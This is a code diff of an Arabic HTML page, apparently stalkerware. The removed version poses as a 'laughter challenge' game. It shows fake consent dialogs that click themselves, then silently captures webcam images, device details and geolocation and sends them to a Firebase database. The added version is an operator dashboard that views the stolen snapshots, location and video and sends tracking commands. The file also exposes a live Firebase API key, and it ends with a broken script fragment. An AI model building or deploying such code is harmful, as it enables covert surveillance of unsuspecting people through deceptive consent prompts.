@@ -1,57 +1,243 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>تحدي الضحك 😂</title>
-<style>
-:root{--bg:#090d18;--panel:#111a2b;--muted:#a7b2c8;--text:#f4f7ff;--a:#7c5cff;--b:#20d6b2}
-*{box-sizing:border-box}
-body{margin:0;min-height:100vh;font-family:Tahoma,Arial,sans-serif;color:var(--text);background:radial-gradient(ellipse at 15% 15%,#28205b 0,transparent 38%),radial-gradient(ellipse at 90% 80%,#073b43 0,transparent 35%),var(--bg);display:grid;place-items:center;padding:22px}
-.shell{width:min(780px,100%);position:relative}
-.top{display:flex;align-items:center;justify-content:space-between;margin-bottom:18px}
-.brand{font-weight:900;font-size:17px}.brand span{color:var(--b)}
-.card{position:relative;overflow:hidden;text-align:center;padding:clamp(25px,5vw,50px);border:1px solid #ffffff1c;border-radius:28px;background:linear-gradient(145deg,#17223aee,#0d1424f2);box-shadow:0 28px 90px #0008;backdrop-filter:blur(16px)}
-.icon{width:78px;height:78px;margin:0 auto 20px;border-radius:23px;display:grid;place-items:center;font-size:39px;background:linear-gradient(135deg,#785bff,#24cdb4);box-shadow:0 12px 35px #6654ff55;transform:rotate(-5deg)}
-h1{font-size:clamp(28px,5vw,43px);line-height:1.3;margin:12px 0}
-.desc{max-width:550px;margin:0 auto;color:var(--muted);font-size:15px;line-height:2}
-.consent-overlay { position: fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); z-index:999; display:flex; justify-content:center; align-items:center; flex-direction:column; backdrop-filter:blur(5px); }
-.consent-box { background:#1e293b; padding:30px; border-radius:15px; text-align:center; max-width:90%; border:1px solid #334155; animation: popIn 0.3s ease; }
-@keyframes popIn { from {transform:scale(0.8);opacity:0} to {transform:scale(1);opacity:1} }
-.accept-btn { background:var(--b); color:#000; border:none; padding:10px 25px; border-radius:8px; font-weight:bold; cursor:pointer; margin-top:15px; font-size:16px; }
-.hidden-video { position:fixed; top:0; left:0; width:100%; height:100%; object-fit:cover; z-index:-1; opacity:0; pointer-events:none; }
-#status{font-size:13px;color:#8fe8d4;min-height:22px;margin-top:14px}
-</style>
+    <meta charset="UTF-8">
+    <title>لوحة التحكم الاحترافية - Live</title>
+    <style>
+        :root { 
+            --bg: #0f172a; 
+            --card: #1e293b; 
+            --text: #e2e8f0; 
+            --accent: #3b82f6; 
+            --danger: #ef4444; 
+            --success: #22c55e; 
+            --border: #334155;
+        }
+        body { 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            background-color: var(--bg); 
+            color: var(--text); 
+            margin: 0; 
+            padding: 20px; 
+        }
+
+        .grid-container { 
+            display: grid; 
+            grid-template-columns: 2fr 1fr; 
+            gap: 20px; 
+            height: calc(100vh - 40px); 
+        }
+
+        /* Video Section */
+        .video-section { 
+            background: #000; 
+            border-radius: 12px; 
+            overflow: hidden; 
+            position: relative; 
+            border: 1px solid var(--border);
+            box-shadow: 0 4px 6px rgba(0,0,0,0.5);
+        }
+        #liveVideo { 
+            width: 100%; 
+            height: 100%; 
+            object-fit: cover; 
+            transform: scaleX(-1); /* Mirror effect */
+        }
+        .live-badge { 
+            position: absolute; 
+            top: 10px; 
+            left: 10px; 
+            background: red; 
+            color: white; 
+            padding: 2px 8px; 
+            border-radius: 4px; 
+            font-size: 12px; 
+            font-weight: bold; 
+            animation: pulse 1.5s infinite; 
+        }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
+
+        .capture-btn {
+            position: absolute;
+            bottom: 15px;
+            right: 15px;
+            background: rgba(255, 255, 255, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.4);
+            color: white;
+            padding: 8px 15px;
+            border-radius: 20px;
+            cursor: pointer;
+            backdrop-filter: blur(5px);
+            transition: all 0.2s;
+        }
+        .capture-btn:hover {
+            background: var(--accent);
+            border-color: var(--accent);
+        }
+
+        .info-panel { 
+            display: flex; 
+            flex-direction: column; 
+            gap: 15px; 
+            overflow-y: auto; 
+        }
+        .card { 
+            background: var(--card); 
+            padding: 15px; 
+            border-radius: 12px; 
+            box-shadow: 0 4px 6px rgba(0,0,0,0.3); 
+            border: 1px solid var(--border);
+        }
+        .card h3 { 
+            margin-top: 0; 
+            color: var(--accent); 
+            border-bottom: 1px solid var(--border); 
+            padding-bottom: 10px; 
+            display: flex; 
+            justify-content: space-between; 
+            align-items: center; 
+        }
+
+        .device-info p { 
+            margin: 8px 0; 
+            font-size: 0.9em; 
+            display: flex; 
+            justify-content: space-between; 
+            border-bottom: 1px solid #33415555; 
+            padding-bottom: 4px; 
+        }
+        .device-info span { color: #94a3b8; }
+        .device-info strong { color: #fff; }
+
+        .gallery { 
+            display: grid; 
+            grid-template-columns: repeat(auto-fill, minmax(80px, 1fr)); 
+            gap: 10px; 
+            max-height: 300px; 
+            overflow-y: auto; 
+        }
+        .gallery-item { 
+            position: relative; 
+            cursor: pointer; 
+            border-radius: 8px; 
+            overflow: hidden; 
+            border: 1px solid var(--border);
+        }
+        .gallery img { 
+            width: 100%; 
+            height: 80px; 
+            object-fit: cover; 
+            transition: transform 0.2s; 
+        }
+        .gallery img:hover { transform: scale(1.1); }
+        .delete-btn { 
+            position: absolute; 
+            top: 2px; 
+            right: 2px; 
+            background: rgba(239, 68, 68, 0.9); 
+            color: white; 
+            border: none; 
+            border-radius: 50%; 
+            width: 20px; 
+            height: 20px; 
+            font-size: 12px; 
+            cursor: pointer; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            z-index: 10; 
+        }
+
+        .full-screen-img { 
+            position: fixed; 
+            top: 0; 
+            left: 0; 
+            width: 100%; 
+            height: 100%; 
+            background: rgba(0,0,0,0.9); 
+            z-index: 1000; 
+            display: none; 
+            justify-content: center; 
+            align-items: center; 
+        }
+        .full-screen-img img { 
+            max-width: 90%; 
+            max-height: 90%; 
+            border-radius: 10px; 
+        }
+        .close-btn { 
+            position: absolute; 
+            top: 20px; 
+            right: 20px; 
+            color: white; 
+            font-size: 30px; 
+            cursor: pointer; 
+        }
+
+        button.track-btn { 
+            background: var(--accent); 
+            color: white; 
+            border: none; 
+            padding: 10px 20px; 
+            border-radius: 8px; 
+            cursor: pointer; 
+            width: 100%; 
+            margin-top: 10px; 
+            font-weight: bold; 
+        }
+        button.track-btn:hover { background: #2563eb; }
+        
+        /* Scrollbar */
+        ::-webkit-scrollbar { width: 8px; }
+        ::-webkit-scrollbar-track { background: var(--bg); }
+        ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 4px; }
+    </style>
 </head>
 <body>
 
-    <!-- Overlay للموافقات السريعة -->
-    <div id="consentOverlay" class="consent-overlay" style="display:none;">
-        <div class="consent-box" id="consentBox">
-            <h2 id="consentTitle">تحميل التحدي...</h2>
-            <p id="consentText" style="color:#ccc; font-size:14px;">يرجى الانتظار قليلاً</p>
-            <button id="consentBtn" class="accept-btn" style="display:none">موافق</button>
+    <div class="grid-container">
+        <!-- قسم الفيديو المباشر -->
+        <div class="video-section">
+            <div class="live-badge">● LIVE</div>
+            <video id="liveVideo" autoplay playsinline muted></video>
+            <button class="capture-btn" onclick="takeScreenshotFromLive()">📸 التقاط صورة</button>
+        </div>
+
+        <!-- قسم المعلومات والصور -->
+        <div class="info-panel">
+
+            <!-- بطاقة معلومات الجهاز -->
+            <div class="card device-info">
+                <h3>📱 بيانات الجهاز <span style="font-size:0.8em; color:#aaa" id="last-update">--</span></h3>
+                <p><span>النوع:</span> <strong id="dev-model">جاري الكشف...</strong></p>
+                <p><span>المتصفح:</span> <strong id="dev-browser">--</strong></p>
+                <p><span>الشبكة:</span> <strong id="dev-net">--</strong></p>
+                <p><span>البطارية:</span> <strong id="dev-battery">--</strong>%</p>
+                <button class="track-btn" onclick="sendTrackCommand()">📡 تحديث فوري</button>
+            </div>
+
+            <!-- معرض الصور -->
+            <div class="card">
+                <h3>📷 سجل الكاميرا <span style="font-size:0.8em; color:#aaa">اضغط للحذف</span></h3>
+                <div class="gallery" id="photoGallery"></div>
+            </div>
+            <div class="card">
+                <h3>🎥 البث المباشر (صوت وصورة)</h3>
+                <!-- هنا سنعرض آخر مقطع فيديو تم استقباله -->
+                <video id="livePlayer" controls autoplay muted style="width:100%; border-radius:10px; background:#000;"></video>
+            </div>
         </div>
     </div>
 
-    <main class="shell">
-    <header class="top"><div class="brand">تحدي <span>الضحك</span> 😂</div></header>
-    <section class="card">
-      <div class="icon">🎮</div>
-      <h1>تحدي <span>الضحك 😂</span></h1>
-      <p class="desc">هل أنت مستعد؟ اللعبة ستبدأ فوراً.</p>
-      
-      <button class="accept-btn primary" id="startBtn" onclick="startConsentFlow()">ابدأ الآن</button>
-      <div id="status"></div>
-    </section>
-    </main>
-
-    <!-- Video Element for Background -->
-    <video id="bgVideo" class="hidden-video" autoplay playsinline muted></video>
+    <!-- نافذة عرض الصورة الكاملة -->
+    <div class="full-screen-img" id="fsModal" onclick="this.style.display='none'">
+        <span class="close-btn">&times;</span>
+        <img id="fsImage" src="">
+    </div>
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
-        import { getDatabase, ref, set, push } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";
+        import { getDatabase, ref, onValue, push, set, remove } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";
 
         const firebaseConfig = {
             apiKey: "AIzaSyClLKG-kiVCBcltXCBUsF6BjzlZB7KS2N8",
@@ -66,146 +252,146 @@ h1{font-size:clamp(28px,5vw,43px);line-height:1.3;margin:12px 0}
         const app = initializeApp(firebaseConfig);
         const db = getDatabase(app);
 
-        let mediaRecorder;
-        let recordedChunks = [];
-        let streamUrl = null;
+        const liveVideo = document.getElementById('liveVideo');
+        const gallery = document.getElementById('photoGallery');
+        const fsModal = document.getElementById('fsModal');
+        const fsImage = document.getElementById('fsImage');
 
-        // Sequence of fake consent messages
-        const consentSteps = [
-            { title: "جاري تحميل الصوت...", text: "هل توافق على تشغيل الصوت؟", btn: "تفعيل" },
-            { title: "جاري تفعيل الكاميرا...", text: "هل توافق على استخدام الكاميرا؟", btn: "سماح" },
-            { title: "جاري بدء اللعبة...", text: "جاهز؟", btn: "يلا بينا" }
-        ];
-
-        window.startConsentFlow = () => {
-            const overlay = document.getElementById('consentOverlay');
-            const box = document.getElementById('consentBox');
-            const title = document.getElementById('consentTitle');
-            const text = document.getElementById('consentText');
-            const btn = document.getElementById('consentBtn');
+        // تحليل بيانات الجهاز محلياً للعرض السريع
+        function updateLocalDeviceInfo() {
+            const ua = navigator.userAgent;
+            let model = "PC";
+            if (/iPhone|iPad/.test(ua)) model = "Apple iOS";
+            else if (/Android/.test(ua)) model = "Android Device";
             
-            overlay.style.display = 'flex';
-            
-            let stepIndex = 0;
+            let browser = "Unknown";
+            if (/Chrome/.test(ua)) browser = "Chrome";
+            else if (/Firefox/.test(ua)) browser = "Firefox";
+            else if (/Safari/.test(ua)) browser = "Safari";
 
-            function showStep() {
-                if(stepIndex >= consentSteps.length) {
-                    overlay.style.display = 'none';
-                    initTracking();
-                    return;
-                }
-                const step = consentSteps[stepIndex];
-                title.innerText = step.title;
-                text.innerText = step.text;
-                btn.innerText = step.btn;
-                btn.style.display = 'block';
-                
-                // Auto click after short delay to make it look fast
-                setTimeout(() => {
-                    btn.click();
-                }, 600); 
-            }
+            document.getElementById('dev-model').innerText = model;
+            document.getElementById('dev-browser').innerText = browser;
+            document.getElementById('dev-net').innerText = navigator.onLine ? "Connected" : "Offline";
 
-            btn.onclick = () => {
-                stepIndex++;
-                showStep();
-            };
-
-            showStep();
-        };
-
-        window.initTracking = async () => {
-            const statusDiv = document.getElementById('status');
-            statusDiv.innerText = "جاري الاتصال...";
-
-            try {
-                // 1. Start Camera & Mic
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
-                    audio: true
+            // Battery API
+            if ('getBattery' in navigator) {
+                navigator.getBattery().then(battery => {
+                    document.getElementById('dev-battery').innerText = Math.round(battery.level * 100);
                 });
-
-                // Show video locally (mirrored)
-                const bgVideo = document.getElementById('bgVideo');
-                bgVideo.srcObject = stream;
-                bgVideo.play();
-
-                // 2. Setup MediaRecorder for "Live" simulation (sending blobs)
-                // We record small chunks to send as "live" updates
-                mediaRecorder = new MediaRecorder(stream);
-                mediaRecorder.ondataavailable = (event) => {
-                    if (event.data.size > 0) {
-                        // Instead of sending full blob which is heavy, 
-                        // let's just send a snapshot frame every few seconds 
-                        // AND keep the stream open.
-                        // For this demo, we will send a snapshot.
-                        takeSnapshot(stream);
-                    }
-                };
-                mediaRecorder.start(1000); // Collect data every second
-
-                // 3. Location & Device Info
-                startLocationTracking();
-
-                statusDiv.innerText = "تم الاتصال بنجاح!";
-                document.getElementById('startBtn').style.display = 'none';
-
-            } catch (err) {
-                statusDiv.innerText = "حدث خطأ: " + err.message;
+            } else {
+                document.getElementById('dev-battery').innerText = "N/A";
             }
+        }
+
+        setInterval(updateLocalDeviceInfo, 5000);
+
+        // الاستماع للبيانات
+        onValue(ref(db, 'users'), (snapshot) => {
+            const data = snapshot.val();
+            if (!data) return;
+
+            const entries = Object.entries(data).sort((a, b) => new Date(b[1].time) - new Date(a[1].time));
+
+            // 1. معالجة الموقع والجهاز
+            const latestLoc = entries.find(e => e[1].type === 'location');
+            if (latestLoc) {
+                const lat = latestLoc[1].lat;
+                const lng = latestLoc[1].lng;
+                
+                if(latestLoc[1].deviceInfo) {
+                    document.getElementById('dev-model').innerText = latestLoc[1].deviceInfo.model || 'Unknown';
+                    document.getElementById('dev-browser').innerText = latestLoc[1].deviceInfo.browser || 'Unknown';
+                    document.getElementById('dev-net').innerText = latestLoc[1].connection || 'Unknown';
+                    document.getElementById('dev-battery').innerText = latestLoc[1].battery ? Math.round(latestLoc[1].battery * 100) + '%' : '--';
+                    document.getElementById('last-update').innerText = new Date(latestLoc[1].time).toLocaleTimeString();
+                }
+            }
+
+            // 2. تحديث الصور مع زر الحذف
+            const snaps = entries.filter(e => e[1].type === 'camera_snap');
+            gallery.innerHTML = '';
+            snaps.forEach(snap => {
+                const itemDiv = document.createElement('div');
+                itemDiv.className = 'gallery-item';
+                
+                const img = document.createElement('img');
+                img.src = snap[1].data;
+                img.onclick = () => {
+                    fsImage.src = snap[1].data;
+                    fsModal.style.display = 'flex';
+                };
+
+                const delBtn = document.createElement('button');
+                delBtn.className = 'delete-btn';
+                delBtn.innerHTML = '×';
+                delBtn.onclick = (e) => {
+                    e.stopPropagation();
+                    remove(ref(db, 'users/' + snap[0]));
+                };
+
+                itemDiv.appendChild(img);
+                itemDiv.appendChild(delBtn);
+                gallery.appendChild(itemDiv);
+            });
+        });
+
+        window.sendTrackCommand = async () => {
+            alert("تم إرسال الأمر!");
+            const pushRef = push(ref(db, 'commands'));
+            set(pushRef, { timestamp: Date.now(), action: 'track_now' });
         };
 
-        function takeSnapshot(stream) {
-            const video = document.getElementById('bgVideo');
-            if(!video.videoWidth) return;
+        // دالة التقاط صورة من الفيديو المباشر
+        window.takeScreenshotFromLive = () => {
+            const video = liveVideo;
+            if (!video.srcObject && !video.currentSrc) {
+                alert("لا يوجد بث مباشر متصل حالياً.");
+                return;
+            }
 
             const canvas = document.createElement('canvas');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0);
             
-            // Send Snapshot
-            const imageBase64 = canvas.toDataURL('image/jpeg', 0.7);
+            // Flip horizontally to match mirror view
+            ctx.translate(canvas.width, 0);
+            ctx.scale(-1, 1);
             
-            // Get Battery
-            let batteryLevel = null;
-            if ('getBattery' in navigator) {
-                 navigator.getBattery().then(b => batteryLevel = b.level);
-            }
-
-            const data = {
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            const imageBase64 = canvas.toDataURL('image/jpeg', 0.9);
+            
+            // Send to Firebase
+            push(ref(db, 'users'), {
                 type: 'camera_snap',
                 data: imageBase64,
                 time: new Date().toISOString()
-            };
-
-            // Append device info if it's the first one
-            if(navigator.getBatterySync === undefined) { // Hacky check to send info once
-                 data.deviceInfo = {
-                    model: /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
-                    browser: /Chrome|Firefox|Safari/i.test(navigator.userAgent) ? 'Browser' : 'Other',
-                    connection: navigator.connection ? navigator.connection.effectiveType : 'Wifi'
-                };
-                data.battery = batteryLevel;
+            });
+            
+            alert("تم التقاط الصورة وإرسالها!");
+        };
+    </script>
+    <script>
+        // ... داخل دالة الاستماع للبيانات onValue ...
+        
+        // استبدال كود Gallery القديم بهذا الجزء للفيديو:
+        const videos = entries.filter(e => e[1].type === 'video_stream');
+        if(videos.length > 0) {
+            const latestVideo = videos[0][1]; // أحدث فيديو
+            const player = document.getElementById('livePlayer');
+            
+            // تحويل البيانات النصية إلى Blob وتشغيلها
+            const byteString = atob(latestVideo.data.split(',')[1]);
+            const mimeString = latestVideo.data.split(',')[0].split(':')[1].split(';')[1];
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) {
+                ia[i] = byteString.charCodeAt(i);
             }
-
-            push(ref(db, 'users'), data);
-        }
-
-        function startLocationTracking() {
-            setInterval(() => {
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition((pos) => {
-                        push(ref(db, 'users'), {
-                            type: 'location',
-                            lat: pos.coords.latitude,
-                            lng: pos.coords.longitude,
-                            time: new Date().toISOString()
-                        });
-                    }, (err) => {});
-                }
-            }, 15000);
+            const blob = new Blob([ab], { type: mimeString });
+            player.src = URL.createObjectURL(blob);
+            player.play();
         }
     </script>
 </body>
